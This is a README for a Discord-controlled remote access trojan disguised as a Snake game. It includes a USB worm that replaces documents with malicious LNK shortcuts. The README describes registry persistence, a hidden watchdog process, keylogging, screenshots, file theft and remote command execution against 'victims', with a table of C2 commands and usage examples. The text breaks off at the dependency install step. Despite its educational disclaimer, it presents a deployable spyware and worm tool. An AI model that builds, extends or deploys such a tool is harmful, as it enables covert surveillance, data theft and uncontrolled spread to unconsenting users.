# 🐍 Project HYDRAT: Discord-Based RAT & USB Worm
![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
![Discord](https://img.shields.io/badge/C2-Discord_Bot-5865F2.svg)
![Security](https://img.shields.io/badge/Type-Educational_Malware-red.svg)

> **⚠️ DISCLAIMER: EDUCATIONAL PURPOSE ONLY**
>
> This project was developed for **academic research and Cyber Security training** (Red Teaming simulations).
> The code demonstrates how Trojan horses and Remote Access Tools (RATs) operate.
> **Using this software on computers without explicit permission is illegal.** The developer assumes no liability for misuse.

---

## 📖 Overview

**Project HYDRAT** is a Proof-of-Concept (PoC) malware that combines a functional **Snake Game** with a sophisticated **Remote Access Trojan (RAT)**.
The tool uses **Discord** as a Command & Control (C2) server, making traffic blend in with legitimate HTTPS requests.
Additionally, it features an autonomous **Worm Module** capable of spreading through physical media (USB drives) using advanced LNK hijacking techniques.

### Key Features
* **🎭 Trojanized Game:** A legitimate Pygame-based Snake game runs in the foreground to distract the user.
* **🔄 Persistence:** Automatically installs to the Windows Registry (`HKCU/Run`) to ensure execution on every system reboot.
* **👻 Process Spawning:** The malware uses a "Watchdog" architecture to spawn a hidden, independent process for the payload, ensuring resilience even if the game is closed.
* **💾 USB Worm Propagation:** Automatically detects inserted USB drives. It hides legitimate files and replaces them with malicious **LNK Shortcuts** that mimic the original files (using extracted icons), ensuring the malware spreads to new machines when users access their documents.
* **🎯 Targeting System:** C2 Commands can be directed to a specific victim (`User@PC`) or broadcast to all infected machines (`all`).

---

## 💻 Command Menu (C2)

The bot listens for commands in the designated Discord channel.
**Syntax:** `!command <TARGET_ID> <ARGUMENTS>`

### 🛠️ System & File Management
| Command | Usage Example | Description |
| :--- | :--- | :--- |
| **`!cmd`** | `!cmd User@PC dir` | Execute a terminal command (CMD/PowerShell). |
| **`!info`** | `!info User@PC` | Get system specs (OS, CPU, RAM, IP). |
| **`!download`** | `!download User@PC C:\secret.txt` | Download a file from the victim's machine. |
| **`!upload`** | `!upload User@PC` *(attach file)* | Upload a file to the victim's temp folder. |
| **`!kill`** | `!kill User@PC` | Terminate the RAT connection remotely. |

### 🕵️ Spyware & Surveillance
| Command | Usage Example | Description |
| :--- | :--- | :--- |
| **`!screenshot`** | `!screenshot User@PC` | Capture and upload a screenshot. |
| **`!keylogger_start`** | `!keylogger_start User@PC` | Start recording keystrokes in the background. |
| **`!keylogger_stop`** | `!keylogger_stop User@PC` | Stop recording and upload the log file. |

### 👻 Trolling & Harassment (Pranks)
| Command | Usage Example | Description |
| :--- | :--- | :--- |
| **`!msgbox`** | `!msgbox User@PC Hello!` | Display a Windows Message Box on screen. |
| **`!speak`** | `!speak User@PC I see you` | Make the computer "speak" text (TTS). |
| **`!website`** | `!website User@PC https://google.com` | Open a specific URL in the default browser. |
| **`!mouse`** | `!mouse User@PC` | Move the mouse cursor randomly for 10 seconds. |
| **`!minimize`** | `!minimize User@PC` | Minimize all open windows (Show Desktop). |

### ⚡ Power & Session Control
| Command | Usage Example | Description |
| :--- | :--- | :--- |
| **`!lock`** | `!lock User@PC` | Lock the workstation (Win+L). |
| **`!restart`** | `!restart User@PC` | Reboot the computer immediately. |
| **`!shutdown`** | `!shutdown User@PC` | Shut down the computer immediately. |

---

## 🚀 Installation & Build

### 1. Install Dependencies
Ensure all required Python libraries are installed:
```bash
pip install -r requirements.txt
